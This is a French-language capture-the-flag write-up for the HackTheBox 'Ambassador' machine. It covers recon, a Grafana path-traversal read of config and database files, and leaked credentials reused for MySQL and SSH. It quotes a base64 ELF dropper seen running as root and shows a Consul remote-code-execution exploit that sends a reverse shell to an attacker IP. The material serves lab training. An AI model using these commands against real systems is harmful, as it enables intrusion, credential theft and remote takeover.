\chapter{Ambassador}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: grafana, sqlite, mysql, consul
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.183
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
22,80,3000,3306

$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
3000/tcp open  ppp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 08 Dec 2022 15:15:49 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 08 Dec 2022 15:15:16 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 08 Dec 2022 15:15:22 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info:
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: FoundRows, Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsTransactions, LongColumnFlag, SupportsCompression, ODBCClient, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, IgnoreSigpipes, LongPassword, InteractiveClient, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x04-\x1A+g8|m4]TF\x0B\x05NU\x01\x1C`\x7F
|_  Auth Plugin Name: caching_sha2_password
\end{verbatim}

\subsubsection{http}


\begin{verbatim}
$ ffuf -u http://ambassador.htb/FUZZ -w common.txt

.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 28ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 52ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 52ms]
categories              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 28ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 44ms]
index.html              [Status: 200, Size: 3654, Words: 809, Lines: 156, Duration: 32ms]
posts                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 28ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 29ms]
sitemap.xml             [Status: 200, Size: 645, Words: 51, Lines: 19, Duration: 27ms]
tags                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 47ms]
:: Progress: [4713/4713] :: Job [1/1] :: 1398 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

categories              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 39ms]
posts                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 34ms]
tags                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 35ms]
404.html                [Status: 200, Size: 1793, Words: 336, Lines: 93, Duration: 28ms]
.html                   [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 37ms]
                        [Status: 200, Size: 3654, Words: 809, Lines: 156, Duration: 37ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 28ms]
\end{verbatim}

\subsubsection{port 3000}
grafana v8.2.0 (d7f71e9eae) est vulnerable a \url{https://www.cvedetails.com/cve/CVE-2021-43798/}{CVE-2021-43798}

\begin{verbatim}
$ searchsploit grafana
.. .SNIP. ..
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read 
        | multiple/webapps/50581.py

\end{verbatim}

en modifiant un peu le code 
\begin{verbatim}
benmusashi@honbu:~/documents/pentesting-games/htb/ambassador$ python ./grafana830-traversal.py -H http://ambassador.htb:3000 -F /etc/passwd
root:x:0:0:root:/root:/bin/bash
.. .SNIP. ..
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false
{"message":"Plugin not found"}

\end{verbatim}
on cherche le
\href{https://grafana.com/docs/grafana/v9.3/setup-grafana/configure-grafana/}{fichier
de config de grafana}
\begin{verbatim}
$ python ./grafana830-traversal.py -H http://ambassador.htb:3000 -F /usr/local/etc/grafana/grafana.ini
[-] File not found

[-] File not found

[-] File not found

[-] File not found

[-] Something went wrong.
$ python ./grafana830-traversal.py -H http://ambassador.htb:3000 -F /etc/grafana/grafana.ini |more
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change

# possible values : production, development
;app_mode = production

# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}
.. .SNIP. ..
security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
\end{verbatim}

yep ca fonctionne

d'après le fichier de config il n'y a pas de bdd de config donc par defaut
sqlite. D'après
\href{https://grafana.com/docs/grafana/v9.3/setup-grafana/installation/debian/#package-details}{ce
lien}
\begin{verbatim}
    Installs binary to /usr/sbin/grafana-server
    Installs Init.d script to /etc/init.d/grafana-server
    Creates default file (environment vars) to /etc/default/grafana-server
    Installs configuration file to /etc/grafana/grafana.ini
    Installs systemd service (if systemd is available) name grafana-server.service
    The default configuration sets the log file at /var/log/grafana/grafana.log
    The default configuration specifies a SQLite3 db at /var/lib/grafana/grafana.db
    Installs HTML/JS/CSS and other Grafana files at /usr/share/grafana
\end{verbatim}

\begin{verbatim}
$ python ./grafana830-traversal.py -H http://ambassador.htb:3000 -F /var/lib/grafana/grafana.db |more
SQLite format 3
\end{verbatim}

le script pose pb sur le fichier donc on passe par curl plutot
\begin{verbatim}

$ curl --path-as-is  http://ambassador.htb:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o data.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  644k  100  644k    0     0   659k      0 --:--:-- --:--:-- --:--:--  658k

sqlite> .schema data_source
CREATE TABLE `data_source` (
`id` INTEGER PRIMARY KEY AUTOIN
.. .SNIP. ..
sqlite> select name, user, password from data_source;
mysql.yaml|grafana|dontStandSoCloseToMe63221!
\end{verbatim}

\subsubsection{Mysql}

\begin{verbatim}
$ mysql -h ambassador.htb -u grafana --password='dontStandSoCloseToMe63221!'
...SNIP...
MySQL [(none)]>
MySQL [(none)]> show databases;
...SNIP...
MySQL [grafana]> use whackywidget
...SNIP...
MySQL [whackywidget]> show tables;
...SNIP...
MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
\end{verbatim}





\subsection{Foothold}
\subsubsection{Developper}
\begin{verbatim}
$ echo 'YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==' | base64 -d
anEnglishManInNewYork027468

$ ssh developer@ambassador.htb
...SNIP...
developer@ambassador:~$

$ cat  .gitconfig
[user]
        name = Developer
        email = developer@ambassador.local
[safe]
        directory = /opt/my-app
$ sudo -l
[sudo] password for developer:
Sorry, user developer may not run sudo on ambassador.

developer@ambassador:~$ ssh-keygen
developer@ambassador:~$ ssh-copy-id -i .ssh/id_rsa.pub localhost
\end{verbatim}

\begin{verbatim}
$ ./linpeas.sh -q
...SNIP...
root        2217  0.0  0.0   2608   596 ?        S    Dec08   0:00  _ sh -c echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toCgoQBWgCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/BDzjX.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/jfXnv' < '/tmp/BDzjX.b64' ; chmod +x '/tmp/jfXnv' ; '/tmp/jfXnv' ; rm -f '/tmp/jfXnv' ; rm -f '/tmp/BDzjX.b64'
root        2222  0.0  0.0   1268  1056 ?        Sl   Dec08   0:02  |   _ /tmp/jfXnv
root        3569  0.0  0.0   2608   596 ?        S    03:01   0:00  _ sh -c echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toCgoQBWgCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/Cvvfr.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/WWFJQ' < '/tmp/Cvvfr.b64' ; chmod +x '/tmp/WWFJQ' ; '/tmp/WWFJQ' ; rm -f '/tmp/WWFJQ' ; rm -f '/tmp/Cvvfr.b64'
...SNIP...

 Interesting GROUP writable files (not in Home) (max 500)
  Group developer:
/etc/consul.d/config.d

...SNIP...
 Executable files potentially added by user (limit 70)
2022-12-09+03:01:10.6794899180 /tmp/WWFJQ
2022-12-08+17:48:37.2102536200 /tmp/jfXnv
2022-09-01+21:55:30.4134982710 /development-machine-documentation/deploy.sh
2022-03-13+23:49:28.1266086810 /opt/my-app/whackywidget/put-config-in-consul.sh
2022-03-13+23:12:27.2277640880 /opt/consul/raft/peers.info
2022-03-13+22:46:05.7719647150 /opt/my-app/whackywidget/manage.py
2022-03-13+22:45:19.7801414270 /opt/my-app/env/bin/django-admin
2022-03-13+22:45:14.0641639620 /opt/my-app/env/bin/sqlformat
2022-03-13+22:44:49.7162616490 /opt/my-app/env/bin/pip3.8
2022-03-13+22:44:49.7162616490 /opt/my-app/env/bin/pip-3.8
2022-03-13+22:44:49.7162616490 /opt/my-app/env/bin/pip3
2022-03-13+22:44:49.7162616490 /opt/my-app/env/bin/pip
2022-03-13+22:44:49.7082616820 /opt/my-app/env/bin/easy_install-3.8
2022-03-13+22:44:49.7082616820 /opt/my-app/env/bin/easy_install3
2022-03-13+22:44:49.7082616820 /opt/my-app/env/bin/easy_install
2022-03-13+22:44:49.6402619590 /opt/my-app/env/bin/wheel-3.8
2022-03-13+22:44:49.6402619590 /opt/my-app/env/bin/wheel
2022-03-13+22:44:49.6122620730 /opt/my-app/env/bin/wheel3
2022-03-13+22:44:49.5602622850 /home/developer/.local/share/virtualenv/seed-app-data/v1.0.1.debian.1/3.8/wheels.lock
2022-03-13+20:54:28.0048451500 /development-machine-documentation/themes/ananke/theme.toml
2022-03-13+20:54:28.0048451500 /development-machine-documentation/themes/ananke/package.json
2022-03-13+20:54:27.9968451670 /development-machine-documentation/themes/ananke/layouts/partials/site-header.html
2022-03-13+20:54:27.9968451670 /development-machine-documentation/themes/ananke/layouts/partials/site-footer.html
2022-03-13+20:54:27.9968451670 /development-machine-documentation/themes/ananke/layouts/index.html
2022-03-13+20:54:27.9968451670 /development-machine-documentation/themes/ananke/layouts/_default/single.html
2022-03-13+20:54:27.9968451670 /development-machine-documentation/themes/ananke/layouts/_default/list.html
2022-03-13+20:54:27.9968451670 /development-machine-documentation/themes/ananke/layouts/_default/baseof.html
2022-03-13+20:54:27.9968451670 /development-machine-documentation/themes/ananke/layouts/404.html
2022-03-13+20:54:27.9928451760 /development-machine-documentation/themes/ananke/LICENSE.md
2022-03-13+20:54:27.9928451760 /development-machine-documentation/themes/ananke/archetypes/default.md
2022-03-13+17:25:20.4959997910 /etc/console-setup/cached_setup_terminal.sh
2022-03-13+17:25:20.4959997910 /etc/console-setup/cached_setup_font.sh
2022-03-13+17:25:20.4879997910 /etc/console-setup/cached_setup_keyboard.sh
\end{verbatim}

\begin{verbatim}

 _ sh -c echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toCgoQBWgCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/BDzjX.b64' ;
 ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/jfXnv'
 < '/tmp/BDzjX.b64' ; chmod +x '/tmp/jfXnv' ; '/tmp/jfXnv' ; rm -f '/tmp/jfXnv' ; rm -f '/tmp/BDzjX.b64'
\end{verbatim}

\begin{verbatim}
$ file /tmp/jfXnv
/tmp/jfXnv: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header

\end{verbatim}


\url{https://github.com/blu3ming/Hashicorp-Consul-RCE-PoC/blob/main/consul_rce_poc.py}

\begin{verbatim}
$ python3 exploit.py -u http://127.0.0.1:8500 -p 4444 -i 10.10.16.3
Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'node:write' on "ambassador"
403
\end{verbatim}


\begin{verbatim}
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running

-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
\end{verbatim}


voila la clé

\begin{verbatim}
developer@ambassador:~$ python3 exploit.py -u http://127.0.0.1:8500 -p 4444 -i 10.10.16.3
200

$ curl   -H 'X-Consul-token: bb03b43b-1d81-d62b-24b5-39540ee469b5'   http://127.0.0.1:8500/v1/agent/service/shell
{"ID":"shell","Service":"shell","Tags":[],"Meta":{},"Port":80,"Address":"127.0.0.1","TaggedAddresses":{"lan_ipv4":{"Address":"127.0.0.1","Port":80},"wan_ipv4":{"Address":"127.0.0.1","Port":80}},"Weights":{"Passing":1,"Warning":1},"EnableTagOverride":false,"ContentHash":"d4dedb23164e9dc9","Datacenter":"dc1"}

$ curl   -H 'X-Consul-token: bb03b43b-1d81-d62b-24b5-39540ee469b5'   http://127.0.0.1:8500/v1/agent/health/service/name/shell
[{"AggregatedStatus":"critical","Service":{"ID":"shell","Service":"shell","Tags":[],"Meta":{},"Port":80,"Address":"127.0.0.1","TaggedAddresses":{"lan_ipv4":{"Address":"127.0.0.1","Port":80},"wan_ipv4":{"Address":"127.0.0.1","Port":80}},"Weights":{"Passing":1,"Warning":1},"EnableTagOverride":false,"Datacenter":"dc1"},"Checks":[{"Node":"ambassador","CheckID":"rc","Name":"Remote code execution","Status":"critical","Notes":"","Output":"exec: \"python\": executable file not found in $PATH","ServiceID":"","ServiceName":"","ServiceTags":null,"Type":"","ExposedPort":0,"Definition":{"Interval":"0s","Timeout":"0s","DeregisterCriticalServiceAfter":"0s","HTTP":"","Header":null,"Method":"","Body":"","TLSServerName":"","TLSSkipVerify":false,"TCP":"","UDP":"","GRPC":"","GRPCUseTLS":false},"CreateIndex":0,"ModifyIndex":0},{"Node":"ambassador","CheckID":"service:shell","Name":"Service 'shell' check","Status":"warning","Notes":"","Output":"","ServiceID":"shell","ServiceName":"shell","ServiceTags":null,"Type":"","ExposedPort":0,"Definition":{"Interval":"0s","Timeout":"0s","DeregisterCriticalServiceAfter":"0s","HTTP":"","Header":null,"Method":"","Body":"","TLSServerName":"","TLSSkipVerify":false,"TCP":"","UDP":"","GRPC":"","GRPCUseTLS":false},"CreateIndex":0,"ModifyIndex":0}]}]
$ curl -X PUT  -H 'X-Consul-token: bb03b43b-1d81-d62b-24b5-39540ee469b5'   http://127.0.0.1:8500/v1/agent/service/deregister/shell
\end{verbatim}

grosse galere dans les reverseshell donc passage pas un script dans \verb+/tmp+
avec simple appel du script
\begin{verbatim}
data = {'ID': 'sh', 'Name': 'Remote code execution', 'Shell': '/bin/bash', 'Interval': '5s'}
data['Args']=['/tmp/test.sh']
\end{verbatim}
\section{Theorie}

\subsection{Consul by hashicorp}
Consul provides a control plane that enables you to register, query, and secure
services deployed across your network. The control plane is the part of the
network infrastructure that maintains a central registry to track services and
their respective IP addresses. It is a distributed system that runs on clusters
of nodes, such as physical servers, cloud instances, virtual machines, or
containers.

The core Consul workflow consists of the following stages:
\begin{itemize}
    \item Register: Teams add services to the Consul catalog, which is a
        central registry that lets services automatically discover each other
        without requiring a human operator. It is the runtime source of truth
        for all services and their addresses. Teams can manually define and
        register services using the CLI or the API, or you can automate the
        process in Kubernetes with service sync. Services can also include
        health checks so that Consul can monitor for unhealthy services.
    \item Query: Consul’s identity-based DNS lets you find healthy services in
        the Consul catalog. Services registered with Consul provide health
        information, access points, and other data that help you control the
        flow of data through your network. Your services only access other
        services through their local proxy according to the identity-based
        policies you define.
    \item Secure: After services locate upstreams, Consul ensures that
        service-to-service communication is authenticated, authorized, and
        encrypted. Consul service mesh secures microservice architectures with
        mTLS and can allow or restrict access based on service identities,
        regardless of differences in compute environments and runtimes.
\end{itemize}

\subsubsection{Arbitrary code execution}

\url{https://lab.wallarm.com/consul-by-hashicorp-from-infoleak-to-rce/}

\begin{verbatim}
$ curl     http://127.0.0.1:8500/v1/agent/checks
{}
\end{verbatim}
Registering a health check

There are three ways to register a service with health checks:

    Start or reload a Consul agent with a service definition file in the agent's configuration directory.
    Call the /agent/service/register HTTP API endpoint to register the service.
    Use the consul services register CLI command to register the service.

When a service is registered using the HTTP API endpoint or CLI command, the checks persist in the Consul data folder across Consul agent restarts.

\url{https://developer.hashicorp.com/consul/api-docs/agent/service#register-service}

\begin{verbatim}
$ cat /etc/consul.d/consul.hcl
acl {
  enabled        = true
  default_policy = "deny"
  down_policy    = "extend-cache"
}

enable_script_checks = true
\end{verbatim}

